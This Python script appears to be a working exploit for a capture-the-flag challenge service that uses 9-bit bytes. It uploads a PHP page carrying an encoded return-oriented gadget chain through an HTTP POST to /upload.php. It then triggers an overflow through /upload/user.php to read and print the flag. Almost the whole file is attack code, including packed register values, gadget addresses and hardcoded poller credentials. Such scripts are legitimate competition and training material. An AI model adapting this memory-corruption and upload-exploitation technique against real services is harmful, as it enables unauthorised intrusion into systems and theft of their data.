#!/usr/bin/python 

import sys, os
import socket
import select
import re
import time
import random
import string
import urllib
import binascii

def i32_to_i27(val):
   bits = ("0"*27+bin(val)[2:])[-27:]
   newval = bits[-18:-9]+bits[-27:-18]+bits[-9:]
   return((newval))

def Data_8_to_9(InData):
	#don't feel like doing all the math, make a bit list then reparse it
	Bits = ""
	for i in InData:
		Bits += (("0"*9)+bin(ord(i))[2:])[-9:]

	#now add in enough bits to make sure we can send full bytes
	if len(Bits) % 8:
		Bits += "0"*(8-(len(Bits) % 8))

	Output = ""
	for i in xrange(0, len(Bits), 8):
		Output += chr(int(Bits[i:i+8], 2))

	return Output

def Data_9_to_8(InData):
	#don't feel like doing all the math, make a bit list then reparse it
	Bits = ""
	for i in InData:
		Bits += (("0"*8)+bin(ord(i))[2:])[-8:]

	Output = ""
	i = 0
	bytecount = 0
	while i < len(Bits):
		if i+9 > len(Bits):
			break;

		c = int(Bits[i+1:i+9], 2)
		bytecount += 1
		Output += chr(c)
		if c == 0xa and ((i+9) % 8) != 0:
			bitstoeat = 8 - (((bytecount*9)+8) % 8)
			i += bitstoeat
			bytecount = 0
		i += 9

	return Output

def Bits9_to_Bytes( Bits ):
	Output = ""
	for i in xrange(0, len(Bits), 8):
		Output += chr(int(Bits[i:i+8], 2))

	return Output


'''
	Output = ""
	i = 0
	bytecount = 0
	while i < len(Bits):
		if i+9 > len(Bits):
			break;

		c = int(Bits[i+1:i+9], 2)
		bytecount += 1
		Output += chr(c)
		if c == 0xa:
			bitstoeat = 8 - (((bytecount*9)+8) % 8)
			i += bitstoeat
			bytecount = 0
		i += 9

	return Output
'''

	

if len(sys.argv) == 3:
	s = socket.create_connection([sys.argv[1], sys.argv[2]])
else:
	s = socket.create_connection(['127.0.0.1', 4000])

exploit_page1 = '''user=legitbs_poller_user&pass=legitbs_poll_pass&upload_filedata=<html><body><?php $var_1 ="BBBBB'''

exploit_bits = ''
exploit_bits += "010111011" + i32_to_i27( 0x717273 ) + i32_to_i27( 0x747576 ) + i32_to_i27( 0x474849 )
exploit_bits += i32_to_i27( 0x4a4b4c ) + i32_to_i27( 0x4d4e4f ) + i32_to_i27( 0x505152 )
exploit_bits += i32_to_i27( 0x535455 ) + i32_to_i27( 0x565758 ) + i32_to_i27( 0x595a5b )
exploit_bits += i32_to_i27( 0x5c5d5e ) + i32_to_i27( 0x5f6061 ) + i32_to_i27( 0x626364 )
exploit_bits += i32_to_i27( 0x4a4b43 ) + i32_to_i27( 0x4d4e4f ) + i32_to_i27( 0x505152 )
exploit_bits += i32_to_i27( 0x4a4b42 ) + i32_to_i27( 0x4d4e4f ) + i32_to_i27( 0x505152 )
exploit_bits += i32_to_i27( 0x4a4b41 ) + i32_to_i27( 0x4d4e4f ) + i32_to_i27( 0x505152 )
exploit_bits += i32_to_i27( 0x3fff66c ) + i32_to_i27( 0x4d4e4f ) + i32_to_i27( 0x5100337 )	# PC = 0x5100337 which is gadget to load all registers from R1
#exploit_bits += i32_to_i27( 0x3fff66c ) + i32_to_i27( 0x4d4e4f ) + i32_to_i27( 0x484755 )	# PC = 0x5100337 which is gadget to load all registers from R1
exploit_bits += i32_to_i27( 0x4a4b4c ) + i32_to_i27( 0x4d4e4f ) + i32_to_i27( 0x505152 )
exploit_bits += i32_to_i27( 0x4a4b4c ) + i32_to_i27( 0x4d4e4f ) + i32_to_i27( 0x505152 )
exploit_bits += i32_to_i27( 0x4a4b4c ) + i32_to_i27( 0x4d4e4f ) + i32_to_i27( 0x818283 )
exploit_bits += i32_to_i27( 0x848586 ) + "010111011"

# At this crash (0x484755) R1 will point to inout_buffer

'''
R00 = 0x4010000	# Flag location
R01 = 0x17			# Flag len
R02 = 0x5010000	# Output Buffer Locatoin
R04 = 0x5012000	# Output Count Addr
R30 = 0x159fe		# Gadget: stt	R01, [R00]; re
R31 = 0x15a8d		# Gadget: dmt  R02, R00, R01

exploit_bits = ''
exploit_bits += "010111011" + i32_to_i27( R00 ) + i32_to_i27( R01 ) + i32_to_i27( R02 )
exploit_bits += i32_to_i27( 0x4a4b4c ) + i32_to_i27( R04 ) + i32_to_i27( 0x505152 )
exploit_bits += i32_to_i27( 0x535455 ) + i32_to_i27( 0x565758 ) + i32_to_i27( 0x595a5b )
exploit_bits += i32_to_i27( 0x5c5d5e ) + i32_to_i27( 0x5f6061 ) + i32_to_i27( 0x626364 )
exploit_bits += i32_to_i27( 0x4a4b43 ) + i32_to_i27( 0x4d4e4f ) + i32_to_i27( 0x505152 )
exploit_bits += i32_to_i27( 0x4a4b42 ) + i32_to_i27( 0x4d4e4f ) + i32_to_i27( 0x505152 )
exploit_bits += i32_to_i27( 0x4a4b41 ) + i32_to_i27( 0x4d4e4f ) + i32_to_i27( 0x505152 )
exploit_bits += i32_to_i27( 0x3fff66c ) + i32_to_i27( 0x4d4e4f ) + i32_to_i27( 0x818283 )
exploit_bits += i32_to_i27( 0x4a4b4c ) + i32_to_i27( 0x4d4e4f ) + i32_to_i27( 0x505152 )
exploit_bits += i32_to_i27( 0x4a4b4c ) + i32_to_i27( 0x4d4e4f ) + i32_to_i27( 0x505152 )
exploit_bits += i32_to_i27( R30 ) + i32_to_i27( R31 ) + i32_to_i27( 0x818283 )
exploit_bits += i32_to_i27( 0x848586 ) + "010111011"
'''



'''
exploit_bits += i32_to_i27( 0x848586 ) + i32_to_i27( 0x878889 ) + i32_to_i27( 0x8a8b8c )
exploit_bits += i32_to_i27( 0x8d8e8f ) + i32_to_i27( 0x909192 ) + i32_to_i27( 0x939495 )
exploit_bits += i32_to_i27( 0x969798 ) + i32_to_i27( 0x999a9b )
'''

print "Exploit bits (len=%d): " % len(exploit_bits),  exploit_bits
''''
exploit_bits = ''
exploit_bits += "0001100" + "001110001001110010001110011" + "001110001001110010001110011" + "001110001001110010001110011"
exploit_bits += "001110001001110010001110011" + "001110001001110010001110011" + "001110001001110010001110011"
exploit_bits += "001110001001110010001110011" + "001110001001110010001110011" + "001110001001110010001110011"
exploit_bits += "001110001001110010001110011" + "001110001001110010001110011" + "001110001001110010001110011"

exploit_bits += "001110001001110010001110011" + "001110001001110010001110011" + "001110001001110010001110011"
exploit_bits += "001110001001110010001110011" + "001110001001110010001110011" + "001110001001110010001110011"
exploit_bits += "001110001001110010001110011" + "001110001001110010001110011" + "001110001001110010001110011"
exploit_bits += "001110001001110010001110011" + "001110001001110010001110011" + "001110001001110010001110011"
exploit_bits += "00"
'''

exploit_send_data = Bits9_to_Bytes( exploit_bits )



exploit_page2 = '''"; $var_2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"; setcookie($var_1, $var_2); ?></body></html>'''

print "Len1: ", len(exploit_page1)
print "Len2: ", len(exploit_page2)

exploit_page1_9bit = Data_8_to_9( exploit_page1 )
exploit_page2_9bit = Data_8_to_9( exploit_page2 )

print "Len1: ", len(exploit_page1_9bit)
print "LenE: ", len(exploit_send_data)
print "Len2: ", len(exploit_page2_9bit)

print "Exploit 1 bytes (len=%d): " % len(exploit_page1_9bit), binascii.hexlify(exploit_page1_9bit)
print "Exploit bytes (len=%d): " % len(exploit_send_data), binascii.hexlify(exploit_send_data)

exploit_page = exploit_page1 + exploit_send_data + exploit_page2

print "Exploit page is: ", exploit_page

#sys.exit(0)

print "Connected, sending poc\n"

upload_file_requests = { 'user' : 'legitbs_poller_user', 'pass' : 'legitbs_poll_pass', 'upload_filedata' : exploit_page }

#upload_file_request_string = urllib.urlencode( upload_file_requests )
#upload_file_request_string = exploit

#print "URL Decode string is: ", upload_file_request_string

time.sleep( 0.2 )
s.send( Data_8_to_9( "POST /upload.php HTTP/1.1\n" ))
time.sleep( 0.2 )
s.send( Data_8_to_9( "Content-Type: application/x-www-form-urlencoded\n" ))
time.sleep( 0.2 )
s.send( Data_8_to_9( "Content-Length: %d\n" % (len(exploit_page1) + len(exploit_page2) + 117) ))
time.sleep( 0.2 )
s.send( Data_8_to_9( "\n" ) )
time.sleep( 0.2 )
s.send( Data_8_to_9( exploit_page1 ) + exploit_send_data + Data_8_to_9( exploit_page2 + "\n" ))
time.sleep( 0.2 )

time.sleep( 1 )
data9 = s.recv(4096)
data8 = Data_9_to_8(data9)
print "Data recv: ", data8

s.send( Data_8_to_9( "GET /upload/user.php HTTP/1.1\n" ))
time.sleep( 0.2 )

R00 = 0x4010000	# Flag location
R01 = 0x17			# Flag len
R02 = 0x5010000	# Output Buffer Locatoin
R04 = 0x5012000	# Output Count Addr
#R30 = 0x159fe		# Gadget: stt	R01, [R00]; re
R30 = 0x15ae7		# Gadget: hlt
R31 = 0x15ac5		# Gadget: dmt  R02, R00, R01

#R31 = 0x414244

# This will be placed at 0x27740
exploit_bits = ''
exploit_bits += "010111011" +  "010111011" + i32_to_i27( R00 ) + i32_to_i27( R01 ) + i32_to_i27( 0x27fa8 )
exploit_bits += i32_to_i27( 0x27fa8 ) + i32_to_i27( 0x27fa8 ) + i32_to_i27( 0x505152 )
exploit_bits += i32_to_i27( 0x535455 ) + i32_to_i27( 0x565758 ) + i32_to_i27( 0x595a5b )
exploit_bits += i32_to_i27( 0x5c5d5e ) + i32_to_i27( 0x5f6061 ) + i32_to_i27( 0x626364 )
exploit_bits += i32_to_i27( 0x4a4b43 ) + i32_to_i27( 0x4d4e4f ) + i32_to_i27( 0x505152 )
exploit_bits += i32_to_i27( 0x4a4b42 ) + i32_to_i27( 0x4d4e4f ) + i32_to_i27( 0x505152 )
exploit_bits += i32_to_i27( 0x4a4b41 ) + i32_to_i27( 0x4d4e4f ) + i32_to_i27( 0x505152 )
exploit_bits += i32_to_i27( 0x3fff66c ) + i32_to_i27( 0x4d4e4f ) + i32_to_i27( 0x818283 )
exploit_bits += i32_to_i27( 0x4a4b4c ) + i32_to_i27( 0x4d4e4f ) + i32_to_i27( 0x505152 )
exploit_bits += i32_to_i27( 0x4a4b4c ) + i32_to_i27( 0x4d4e4f ) + i32_to_i27( 0x505152 )
exploit_bits += i32_to_i27( R30 ) + i32_to_i27( R31 ) + i32_to_i27( 0x51006a7 ) # -- ORIGINAL
#exploit_bits += i32_to_i27( R30 ) + i32_to_i27( R31 ) + i32_to_i27( 0x414855 )
exploit_bits += i32_to_i27( 0x848586 )

exploit_send_data1 = Bits9_to_Bytes( exploit_bits )

#R31 = 0x414141
exploit_bits = ''
exploit_bits += "010111011" +  "010111011" + i32_to_i27( R00 ) + i32_to_i27( R01 ) + i32_to_i27( R02 )
exploit_bits += i32_to_i27( 0x277a5 ) + i32_to_i27( R04 ) + i32_to_i27( 0x505152 )
exploit_bits += i32_to_i27( 0x535455 ) + i32_to_i27( 0x565758 ) + i32_to_i27( 0x595a5b )
exploit_bits += i32_to_i27( 0x5c5d5e ) + i32_to_i27( 0x5f6061 ) + i32_to_i27( 0x626364 )
exploit_bits += i32_to_i27( 0x4a4b43 ) + i32_to_i27( 0x4d4e4f ) + i32_to_i27( 0x505152 )
exploit_bits += i32_to_i27( 0x4a4b42 ) + i32_to_i27( 0x4d4e4f ) + i32_to_i27( 0x505152 )
exploit_bits += i32_to_i27( 0x4a4b41 ) + i32_to_i27( 0x4d4e4f ) + i32_to_i27( 0x505152 )
exploit_bits += i32_to_i27( 0x3fff66c ) + i32_to_i27( 0x4d4e4f ) + i32_to_i27( 0x818283 )
exploit_bits += i32_to_i27( 0x4a4b4c ) + i32_to_i27( 0x4d4e4f ) + i32_to_i27( 0x505152 )
exploit_bits += i32_to_i27( 0x4a4b4c ) + i32_to_i27( 0x4d4e4f ) + i32_to_i27( 0x505152 )
exploit_bits += i32_to_i27( R30 ) + i32_to_i27( R31 ) + i32_to_i27( 0x818283 )
exploit_bits += i32_to_i27( 0x848586 )

exploit_send_data2 = Bits9_to_Bytes( exploit_bits )


s.send( Data_8_to_9( "Z" * (184)) + exploit_send_data1 + exploit_send_data2 + Data_8_to_9( "\n" ))
time.sleep( 0.2 )
s.send( Data_8_to_9( "\n" ))
time.sleep( 0.2 )


#time.sleep( 3 )

data8 = Data_9_to_8(s.recv(4096))

# Don't know why the flag is coming back to me in ASCII
end_of_line = data8.find('\n')

print "Flag: ", data8[:end_of_line]
'''
data9 = s.recv(4096)
data8 = Data_9_to_8(data9)
print "Last recv: ", data8

data9 = s.recv(4096)
data8 = Data_9_to_8(data9)
print "Last2 recv: ", data8

data9 = s.recv(4096)
data8 = Data_9_to_8(data9)
print "Data recv: ", data8
'''

# Done
sys.exit(0)
